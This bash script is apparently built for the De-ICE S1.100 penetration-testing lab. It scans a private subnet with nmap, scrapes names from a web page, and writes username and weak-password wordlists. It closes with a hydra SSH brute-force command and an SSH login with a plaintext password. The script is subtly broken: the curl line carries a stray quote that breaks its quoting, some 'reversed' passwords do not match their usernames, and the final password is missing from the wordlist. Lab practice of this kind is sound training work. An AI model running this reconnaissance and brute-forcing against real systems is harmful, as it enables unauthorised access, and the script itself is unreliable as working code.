#!/bin/bash

# De-ICE S1.100 Reconnaissance Script
echo "=== De-ICE S1.100 Reconnaissance ==="
echo "Target: Lab network (172.20.0.0/24)"
echo ""

echo "[+] Step 1: Network Discovery"
echo "nmap -sn 172.20.0.0/24"
nmap -sn 172.20.0.0/24
echo ""

echo "[+] Step 2: Port Scanning Discovered Hosts"  
echo "nmap -sC -sV 172.20.0.2 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6"
nmap -sC -sV 172.20.0.2 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6
echo ""

echo "[+] Step 3: Web Enumeration"
echo "curl -s http://172.20.0.5 | grep -E '(Name|Email)'"
curl -s http://172.20.0.5 | grep -E '(Name|Email)'"
echo ""

echo "[+] Step 4: Generate Username List"
cat > /root/lab/users.txt << 'EOF'
aadams
bbanter  
ccoffee
ddeeds
eeikman
root
admin
EOF
echo "Created users.txt with potential usernames"

echo "[+] Step 5: Generate Password List"
cat > /root/lab/passwords.txt << 'EOF'
password
password123
123456
admin
root
aadams
bbanter
ccoffee
ddeeds
eeikman
smadaa
retnabtb
eeffocc
sdeedd
namkie
company
deice
2003
2004
security
welcome
letmein
EOF
echo "Created passwords.txt with common weak passwords"

echo ""
echo "=== Ready for Exploitation ==="
echo "Next steps:"
echo "1. FTP enumeration: ftp 172.20.0.4"
echo "2. SSH brute force: hydra -L users.txt -P passwords.txt 172.20.0.3 ssh"
echo "3. SSH access: ssh aadams@172.20.0.3 (password: nostaw)"